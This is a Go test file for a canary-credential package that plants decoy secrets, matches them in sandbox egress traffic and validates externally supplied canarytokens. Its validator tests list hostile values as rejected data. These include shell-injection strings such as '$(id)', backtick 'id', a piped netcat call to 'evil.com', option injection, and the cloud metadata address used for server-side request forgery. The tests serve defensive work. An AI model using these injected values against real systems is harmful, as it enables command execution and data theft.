package canary

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestNewSkipsRealCredentialGroups(t *testing.T) {
	dir := t.TempDir()
	s, err := New("AWS_ACCESS_KEY_ID DATABASE_URL", "/home/u/.docker", dir)
	if err != nil {
		t.Fatal(err)
	}
	for _, label := range []string{"cloud", "database", "registry"} {
		if s.Credential(label) != nil {
			t.Errorf("%s canary should be skipped", label)
		}
	}
	for _, c := range s.Credentials {
		if !strings.HasSuffix(c.Host, ".invalid") {
			t.Errorf("%s is not reserved", c.Host)
		}
	}
	if err := s.Plant(dir); err != nil {
		t.Fatal(err)
	}
	path := filepath.Join(dir, "set.json")
	if err := s.Write(path); err != nil {
		t.Fatal(err)
	}
	got, err := Read(path)
	if err != nil {
		t.Fatal(err)
	}
	if got.RunID != s.RunID {
		t.Fatal("run ID changed")
	}
}

func TestMatcherUsesExactHostAndToken(t *testing.T) {
	s, err := New("", "", "/private/canary")
	if err != nil {
		t.Fatal(err)
	}
	m := NewMatcher(s)
	c := s.Credentials[0]
	if _, ok := m.Host(c.Host); !ok {
		t.Fatal("own host not matched")
	}
	if _, ok := m.Host("evil." + c.Host); ok {
		t.Fatal("subdomain should not match")
	}
	if _, ok := m.Bytes([]byte("Authorization: Bearer " + c.Value)); !ok {
		t.Fatal("token not matched")
	}
}

func TestAddExternal(t *testing.T) {
	s, err := New("", "", "/private/canary")
	if err != nil {
		t.Fatal(err)
	}
	if err := s.AddExternal([]string{"Abc123.TokenExample.COM.", "abc123.tokenexample.com"}); err != nil {
		t.Fatal(err)
	}
	n0 := len(s.Credentials)
	if err := s.AddExternal([]string{"abc123.tokenexample.com", "short.invalid"}); err != nil {
		t.Fatal(err)
	}
	if len(s.Credentials) != n0+1 {
		t.Fatalf("credentials went %d to %d, want one added (the duplicate removed)", n0, len(s.Credentials))
	}
	ext := map[string]bool{"abc123.tokenexample.com": false, "short.invalid": false}
	for _, c := range s.Credentials {
		if want, known := ext[c.Host]; known {
			if !want {
				ext[c.Host] = true
			}
			if !c.External || c.Value != c.Host {
				t.Fatalf("external credential = %+v", c)
			}
		} else if c.External {
			t.Fatalf("planted credential marked external: %+v", c)
		}
	}
	for h, seen := range ext {
		if !seen {
			t.Fatalf("external token %s missing", h)
		}
	}
	m := NewMatcher(s)
	if _, ok := m.Host("ABC123.tokenexample.com"); !ok {
		t.Fatal("external host not matched")
	}
	if _, ok := m.Host("sub.abc123.tokenexample.com"); ok {
		t.Fatal("subdomain should not match")
	}
	if _, ok := m.Bytes([]byte("GET http://abc123.tokenexample.com/x")); !ok {
		t.Fatal("external host not matched in request bytes")
	}
	if err := s.AddExternal([]string{"no dot"}); err == nil {
		t.Fatal("hostname with a space accepted")
	}
	if err := s.AddExternal([]string{"bare"}); err == nil {
		t.Fatal("bare label accepted")
	}
	if err := s.AddExternal([]string{""}); err == nil {
		t.Fatal("empty hostname accepted")
	}

	// Value tokens: name=value watches a string instead of a hostname.
	if err := s.AddExternal([]string{
		"aws-keys=AKIAIOSFODNN7EXAMPLE",
		"card=4111 1111 1111 1111",
		"jwt=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.SflKxwRJ",
		"aws-keys=AKIAIOSFODNN7EXAMPLE",
	}); err != nil {
		t.Fatal(err)
	}
	var vals []string
	for _, c := range s.Credentials {
		if !c.External || c.Host != "" {
			continue
		}
		vals = append(vals, c.Value)
		if !strings.Contains(c.Label, "canarytoken") {
			t.Fatalf("value token label %q does not name a canarytoken", c.Label)
		}
	}
	want := []string{"AKIAIOSFODNN7EXAMPLE", "4111111111111111", "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.SflKxwRJ"}
	if len(vals) != len(want) {
		t.Fatalf("value tokens = %v, want %v (deduplicated, spaces and dashes removed)", vals, want)
	}
	for i := range want {
		if vals[i] != want[i] {
			t.Fatalf("value token %d = %q, want %q", i, vals[i], want[i])
		}
	}
	m = NewMatcher(s)
	if _, ok := m.Bytes([]byte(`{"key":"AKIAIOSFODNN7EXAMPLE"}`)); !ok {
		t.Fatal("value token not matched in bytes")
	}
	if _, ok := m.Host(""); ok {
		t.Fatal("value token registered as a host")
	}
	for _, bad := range []string{"x=a;b", "novalue=", "=novalue", "  =  ", "x=a`id`"} {
		if err := s.AddExternal([]string{bad}); err == nil {
			t.Fatalf("value token %q accepted", bad)
		}
	}

	// The external entries survive the round trip through set.json.
	dir := t.TempDir()
	if err := s.Plant(dir); err != nil {
		t.Fatal(err)
	}
	path := filepath.Join(dir, "set.json")
	if err := s.Write(path); err != nil {
		t.Fatal(err)
	}
	got, err := Read(path)
	if err != nil {
		t.Fatal(err)
	}
	var found bool
	for _, c := range got.Credentials {
		if c.Host == "abc123.tokenexample.com" && c.External {
			found = true
		}
	}
	if !found {
		t.Fatal("external credential lost in the JSON round trip")
	}
	var valueKept bool
	for _, c := range got.Credentials {
		if c.Host == "" && c.Value == "4111111111111111" && c.External {
			valueKept = true
		}
	}
	if !valueKept {
		t.Fatal("value token lost in the JSON round trip")
	}
}

// The runner expands the token list unquoted, so a token that splits into
// words, reads as an option, or expands as a glob is not data on its way to
// canary new but a command line written by whoever supplied the token: the
// project file is not trusted, and card=4111 1111 1111 1111 was enough to make
// the previous release pass four arguments instead of one.
func TestValidToken(t *testing.T) {
	ok := []string{
		"abc123.canarytokens.com",
		"ABC123.CanaryTokens.com.",
		"card=4111-1111-1111-1111",
		"aws=AKIAIOSFODNN7EXAMPLE",
		"key=abc/def+ghi~jkl=mno:pqr",
		"slack=xoxb-12-34-AbCdEf",
	}
	for _, tok := range ok {
		if err := ValidToken(tok); err != nil {
			t.Errorf("ValidToken(%q): %v", tok, err)
		}
	}
	bad := []string{
		"",
		"   ",
		" abc.com",
		"abc.com ",
		"abc def.com",         // word splitting
		"card=4111 1111 1111", // the shipped bug
		"card=",               // no value to watch
		"=4111111111111111",   // no name
		"$(id).canarytokens.com",
		"abc.com;touch /tmp/x",
		"abc.com|nc evil.com 4444",
		"abc.com`id`",
		"*abc.com",
		"-abc.canarytokens.com", // would read as an option to canary new
		"--allow=evil.com",
		"abc.com\n",
		"localhost", // no dot: cannot reach a token service's nameserver
		"169.254.169.254",
		"1.2.3.4",
	}
	for _, tok := range bad {
		if err := ValidToken(tok); err == nil {
			t.Errorf("ValidToken(%q) accepted", tok)
		}
	}
}

// A token host outside the allow-list is forwarded by the proxy, so an address
// arriving from a project file would have this unconfined process fetch the
// host's own metadata endpoint on the sandbox's behalf.
func TestAddExternalRejectsAddressLiterals(t *testing.T) {
	bad := []string{
		"169.254.169.254",
		"127.0.0.1",
		"10.0.0.1",
		"[::1]",
		"localhost",
		"abc..com",
		"abc-.com",
		".abc.com",
		"abc.123", // last label all digits: a name cannot end this way
	}
	for _, tok := range bad {
		s, err := New("", "", "/private/canary")
		if err != nil {
			t.Fatal(err)
		}
		if err := s.AddExternal([]string{tok}); err == nil {
			t.Errorf("AddExternal(%q) accepted", tok)
		}
	}
	s, err := New("", "", "/private/canary")
	if err != nil {
		t.Fatal(err)
	}
	if err := s.AddExternal([]string{"ABC123.TokenExample.COM."}); err != nil {
		t.Fatal(err)
	}
	c := s.Credential("external canarytoken")
	if c == nil || c.Host != "abc123.tokenexample.com" {
		t.Fatalf("token host not normalised: %+v", c)
	}
}

// Reader and writer must apply the same rule, or a set file crafted by a
// sandboxed process could plant a host that AddExternal would have refused.
func TestReadRejectsExternalHostAddExternalRefuses(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "set.json")
	write := func(body string) error {
		if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
			return err
		}
		_, err := Read(path)
		return err
	}
	const runID = "0123456789abcdef01234567"
	for _, host := range []string{"169.254.169.254", "127.0.0.1", "localhost", "abc.123"} {
		body := `{"run_id":"` + runID + `","credentials":[{"label":"external canarytoken","host":"` + host +
			`","value":"` + host + `","external":true}]}`
		if err := write(body); err == nil {
			t.Errorf("Read accepted an external token host of %q", host)
		}
	}
	body := `{"run_id":"` + runID + `","credentials":[{"label":"external canarytoken","host":"abc.tokenexample.com","value":"abc.tokenexample.com","external":true}]}`
	if err := write(body); err != nil {
		t.Errorf("Read rejected a sound external token: %v", err)
	}
}

// A credential with no host and no value would otherwise become an empty
// needle, which every request contains: the set would deny all egress rather
// than watch for one credential.
func TestNewMatcherIgnoresEmptyValue(t *testing.T) {
	s := &Set{RunID: "x", Credentials: []Credential{{Label: "blank", Host: "", Value: "", External: true}}}
	m := NewMatcher(s)
	if _, ok := m.Bytes([]byte("GET / HTTP/1.1")); ok {
		t.Fatal("an empty token matched a request that contained nothing")
	}
	if _, ok := m.Bytes(nil); ok {
		t.Fatal("an empty token matched nothing at all")
	}
}
